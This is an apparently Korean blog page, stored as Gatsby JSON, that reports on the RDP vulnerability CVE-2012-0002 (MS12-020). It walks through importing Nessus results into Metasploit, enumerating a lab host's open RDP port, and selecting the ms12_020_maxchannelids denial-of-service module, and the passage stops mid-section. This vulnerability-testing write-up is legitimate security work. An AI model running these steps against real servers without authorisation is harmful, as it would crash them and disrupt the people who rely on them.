{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/cve_2012_0002_1-day/",
    "result": {"data":{"cur":{"id":"05516669-dd08-58fe-8b40-c25988155ece","html":"<h1 id=\"취약점-분석-보고서-cve-2012-0002\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B3%B4%EA%B3%A0%EC%84%9C-cve-2012-0002\" aria-label=\"취약점 분석 보고서 cve 2012 0002 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석 보고서 CVE-2012-0002</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 163.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image000\"\n        title=\"image000\"\n        src=\"/static/ad564f14a629de93a30250d1aba9cd59/76aed/image000.png\"\n        srcset=\"/static/ad564f14a629de93a30250d1aba9cd59/e9ff0/image000.png 180w,\n/static/ad564f14a629de93a30250d1aba9cd59/f21e7/image000.png 360w,\n/static/ad564f14a629de93a30250d1aba9cd59/76aed/image000.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"metasploit-취약성-테스트\" style=\"position:relative;\"><a href=\"#metasploit-%EC%B7%A8%EC%95%BD%EC%84%B1-%ED%85%8C%EC%8A%A4%ED%8A%B8\" aria-label=\"metasploit 취약성 테스트 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit 취약성 테스트</h2>\n<h3 id=\"nessus-db-정보-내보내기\" style=\"position:relative;\"><a href=\"#nessus-db-%EC%A0%95%EB%B3%B4-%EB%82%B4%EB%B3%B4%EB%82%B4%EA%B8%B0\" aria-label=\"nessus db 정보 내보내기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Nessus DB 정보 내보내기</h3>\n<p>Metasploit Exploit Framework를 통해 대상 서비스 취약성 점검을 하기 위해\nNessus를 바탕으로 점검한 결과를 DB 형태로 내보내기를 진행 파일은 xml\n유형의 Nessus 확장자 구성으로 되어있으며 해당 파일일 작업 공간에 저장\n한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAClklEQVQoz2WR3UvTURjHjy9R9AcEeVMUhGa6+bb5si3XNKcmSUZQkYgaKWhQN10VKdRF9FcEXRd1011BeREKuiGViTnnNmNs+73v99t+5zzfOEMh64EvX55znvN5nofDvsZ/nN3a2qpTVfVDJpNBMpnkuVwOQghks1mkUqmKG4YB13Wxs7MDWacoCnbTaSyvrCAWj2MtFkNBUcDyiip0wxCGaVGhUEA+nyf5WAJVVYWEm6YJx3EqQJnLOtu2SdndxbeVFbG1vu7ubW5yM5vlzNBVaLpeKQZA2A8J/DuI6P8zRaH89ja0dBo8lwPpOpicSMqyLCqXyxJMEi4l8wOIBB64PHccR9i2jb1MJvVzY+NNMpl8L4R4xxRFISkJlV4sFqlUKtH+inRoyH2XzS3LcjnnMn9VNE22sb7OhBCMGbruGoZRkWWarqIo/Mnicxq7OY67s/dp8t4cpmbmMT07TzduT2Bm7gFtJxJc0zRHbiGEeA2AaZpWKzivZkWnBLtUhmWX4JQ5dMPArfEptPiD5PUH0dTejdP1zTh1rgl1Z+rJH4pgO5GofJRcnYjeEhHjnFdLZyVOCw6nhWKZL3LgqaYbz6Ij135fjEQxGB0RfZFBBHrCCATC1N7WhWCoT1+LxV86tv1YCPECwHU5IYAq6cwsEzNKghHAvv9KygvW1hNeHR0exdjwKB+NXsVw3xCGIoNisHcA/d29KcbYsY9fltg+6JCY6bg1huPWLC2v1soudyamj3t8wXigtx/+rhBv9vrgafHD29opmlo7caG1MxMauHKSMcY+fV46QkTVh4AH0djiZ56OAPP4gkfPe32xek8HGrw+3uD1obGtC76esJgMX8Z8JJp50NF54pG/mz0MXapi/8QfSUWKnJOd3hIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image8\"\n        title=\"image8\"\n        src=\"/static/d48f22e3a3d38f69a2e77d01f6152b95/d8f62/image8.png\"\n        srcset=\"/static/d48f22e3a3d38f69a2e77d01f6152b95/e9ff0/image8.png 180w,\n/static/d48f22e3a3d38f69a2e77d01f6152b95/f21e7/image8.png 360w,\n/static/d48f22e3a3d38f69a2e77d01f6152b95/d8f62/image8.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"metasploit-workspace\" style=\"position:relative;\"><a href=\"#metasploit-workspace\" aria-label=\"metasploit workspace permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit workspace</h3>\n<p>Metasploit 상에 취약점 점검 대상의 정보를 관리하기 위해 Nessus DB정보를\n받아와 작업할 공간을 만든다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAn0lEQVQY053OSQ6CMBhAYS6jHYC4ENoiYBkKLT+DES0mqPe/hhviupq87Zc8D8YFxsXALWIlpswPBfE5pswlr8lbXfbipHiiuFBpbsJDikjshLUcqqyVZc8TFbEiOxueKFcsq3W2r8t1HaeHNrPuZiZq1+0Onnf7hsHWzdQPVhawQ0dXnOZQqQlTRgNOA+HINoxIvMcRIuwntuE/zBd/AAoqXmFe/tqKAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image9\"\n        title=\"image9\"\n        src=\"/static/304e57f44cea8f8eb27504749eafba40/f058b/image9.png\"\n        srcset=\"/static/304e57f44cea8f8eb27504749eafba40/e9ff0/image9.png 180w,\n/static/304e57f44cea8f8eb27504749eafba40/f21e7/image9.png 360w,\n/static/304e57f44cea8f8eb27504749eafba40/f058b/image9.png 630w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">workspace <span class=\"token operator\">-</span>a \\<span class=\"token operator\">&lt;</span>작업 공간\\<span class=\"token operator\">></span>  \\# 작업 공간 추가\n\nworkspace \\<span class=\"token operator\">&lt;</span>작업 공간\\<span class=\"token operator\">></span>     \\# 작업 공간 이동</code></pre></div>\n<h3 id=\"metasploit-db-연결-상태-확인-및-가져오기\" style=\"position:relative;\"><a href=\"#metasploit-db-%EC%97%B0%EA%B2%B0-%EC%83%81%ED%83%9C-%ED%99%95%EC%9D%B8-%EB%B0%8F-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0\" aria-label=\"metasploit db 연결 상태 확인 및 가져오기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit DB 연결 상태 확인 및 가져오기</h3>\n<p>데이터베이스 상태를 확인한 후 만약 실패로 나온다면 PostgreSQL 서비스를\n키도록 한다. db_import 명령을 통해 다운 받은 Nessus DB 결과 정보를\n불러온다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAyElEQVQY053Q0W7CIBTG8b6Mo1BKTTY4PYDVMSi0tZvV1Djf/0Fm4o29mEuW/HPufvmSk8X0HeLU72c0rVTObiKgB/SbprNNYrzOmfqtbLu7DOPcDXNoD1/Ttd/PqT9tdwOgRxMIlS/522MLrO11/Dz79hDilPrT+8cYu6O2rQRXa1+bgCYocBIcoJfgaPGAbZO4QFoA48B4fb9lpcXaiLUpK11WmgvkQpdCc6EXyyvySqjMmSJU5UwS+kcLTAt48pLnZf+WN/wDPLhUg78vXBwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image10\"\n        title=\"image10\"\n        src=\"/static/8d4ff2f976488f36ba8b794b3f405248/d8f62/image10.png\"\n        srcset=\"/static/8d4ff2f976488f36ba8b794b3f405248/e9ff0/image10.png 180w,\n/static/8d4ff2f976488f36ba8b794b3f405248/f21e7/image10.png 360w,\n/static/8d4ff2f976488f36ba8b794b3f405248/d8f62/image10.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">db_status               \\# DB 상태 확인\n\ndb_import \\<span class=\"token operator\">&lt;</span>파일 경로\\<span class=\"token operator\">></span>   \\# DB 불러오기</code></pre></div>\n<h3 id=\"점검-대상-서비스-정보-확인\" style=\"position:relative;\"><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%A0%95%EB%B3%B4-%ED%99%95%EC%9D%B8\" aria-label=\"점검 대상 서비스 정보 확인 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>점검 대상 서비스 정보 확인</h3>\n<p>services 명령을 통해 서비스 정보를 확인한 결과 점검 대상인 msrdp/3389\n서비스가 열러 있음을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAvElEQVQY05XNWxKCIBhA4RbTxUtmiT+CpKKgCBaadltA+19D0wasZs7rN2eh2jGhwg+o4+F/W8S4XK4jb0silMeYI+COhw+ogKTyA7pxYQ63euTViVcdAk6ozAq9j7K80EHIvp9t/zTdtVEXmtbsqFLWxLgUtfUDMr/94MZMpbRcWqASqAAinC1hufZ+wbfh0etx6CZTn0WmxFFByE5Nv9ul3/HL3u5qeLbDJM6GyZ7rCmVjaZIwXbngzuI31VlWtt+rASMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image11\"\n        title=\"image11\"\n        src=\"/static/4cbacd65a023b957fe7c9c22e2af4b41/32056/image11.png\"\n        srcset=\"/static/4cbacd65a023b957fe7c9c22e2af4b41/e9ff0/image11.png 180w,\n/static/4cbacd65a023b957fe7c9c22e2af4b41/f21e7/image11.png 360w,\n/static/4cbacd65a023b957fe7c9c22e2af4b41/32056/image11.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">services\n\n\\# <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>     <span class=\"token number\">3389</span>     tcp         msrdp         <span class=\"token builtin\">open</span></code></pre></div>\n<h3 id=\"점검-대상-호스트-정보\" style=\"position:relative;\"><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%ED%98%B8%EC%8A%A4%ED%8A%B8-%EC%A0%95%EB%B3%B4\" aria-label=\"점검 대상 호스트 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>점검 대상 호스트 정보</h3>\n<p>점검 대상 호스트 정보를 통해 네트워크 분류 기준을 정할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAmUlEQVQY032PWQrDMAxEc5k6dhzv8lLHS5oSaO9/oUIFwfSjMIgRaNC8qbSXtpUuATUzjxMNoYCeUEB/XdIlTCmft9mtMuOuTCEUVpmFKlzcLXRlioWubYWwC5XH/FTa2/kdwsNCN675eChTQ3ymfEq9YdLHQ6hN6sJFmtnwOaTDuk55XNY0iot0UTAev839b22EGTlH+P/6AP8eOGcEoHB0AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image12\"\n        title=\"image12\"\n        src=\"/static/a06db8ccbf35e86183e38a2c70d5f65a/d8f62/image12.png\"\n        srcset=\"/static/a06db8ccbf35e86183e38a2c70d5f65a/e9ff0/image12.png 180w,\n/static/a06db8ccbf35e86183e38a2c70d5f65a/f21e7/image12.png 360w,\n/static/a06db8ccbf35e86183e38a2c70d5f65a/d8f62/image12.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">hosts\n\n\\# <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>   <span class=\"token number\">00</span><span class=\"token punctuation\">:</span>0c<span class=\"token punctuation\">:</span><span class=\"token number\">29</span><span class=\"token punctuation\">:</span>c2<span class=\"token punctuation\">:</span>1b<span class=\"token punctuation\">:</span>da  <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>   Windows <span class=\"token number\">2008</span>  SP1   server</code></pre></div>\n<h3 id=\"취약점-검색\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B2%80%EC%83%89\" aria-label=\"취약점 검색 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 검색</h3>\n<p>RDP 서비스에서 발생한 취약점 MS12-020을 기준으로 검색을 진행한다. 실제로\n검사 대상이 취약한지를 테스트하기 위해 Metasploit framework 모듈을 통해\n공격을 진행 한다.</p>\n<p><img src=\"./image13.png\" alt=\"\"></p>\n<p>search ms12-020</p>\n<p>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</p>\n<h3 id=\"ms12_020_maxchannelids-모듈\" style=\"position:relative;\"><a href=\"#ms12_020_maxchannelids-%EB%AA%A8%EB%93%88\" aria-label=\"ms12_020_maxchannelids 모듈 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ms12_020_maxchannelids 모듈</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB3klEQVQY0zXK7WsSYQAA8PtTYoygIBgygqjlLCKaGwvKokFs62XMREgGNYygfdn6EH3YvvQxmaatlro2+jboD1Bv997kTr1z3stzd6bP89yLigRCv88/4srVW5EHiwzDkCRZqVQoiiL/oyiKpulSqVQulymKuhd5PH1jliRPRFGkaRoAQFybuv1o4anjOAhB0wSq2jIMXdc10wSmCQxDtywTY4QQWlqOzsxGRKkGYRcAw3Vd4sLFy6Gbc9s7n7bef1yNvnz1+m3yzcbzlfh68l00lni2Eo/F19aTG4m15Nz8w8BkcHF59UUssfQkurn1gZgITN0J3y8UfmYyuS/ZvXz+oFg8zOa+/cgfFIqHX/f2d3ezqVTmcyp9dPTr+34hPWrpTO74+Dcxfj4QDIWVplKTJAdj27aaTQUhKMsN27Y9z1UUuXV21mjUJUms12uq2pLlhu97GCPi3Nil69Mz3S48Pa1yHMeyrCAILMvyPE/TtCAIDMMIwh+e50nyhOM4RVEAAKqqGgYgApPB+bsL/X4fIaSqqu/7vV7PdV0IIcbYdV2Msed5cMTzPIyx4zgYYwghMTY+EQyFB4OBpmnVatUwDACAruvWCACg0+lomtZut/+OWJZl27ZlWcPh8B9an2Teit6z9gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 2 8 7\"\n        title=\"image 2 8 7\"\n        src=\"/static/2a82d58915e2cb55e7be55b723889f38/977f7/image-2.8.7.png\"\n        srcset=\"/static/2a82d58915e2cb55e7be55b723889f38/e9ff0/image-2.8.7.png 180w,\n/static/2a82d58915e2cb55e7be55b723889f38/f21e7/image-2.8.7.png 360w,\n/static/2a82d58915e2cb55e7be55b723889f38/977f7/image-2.8.7.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        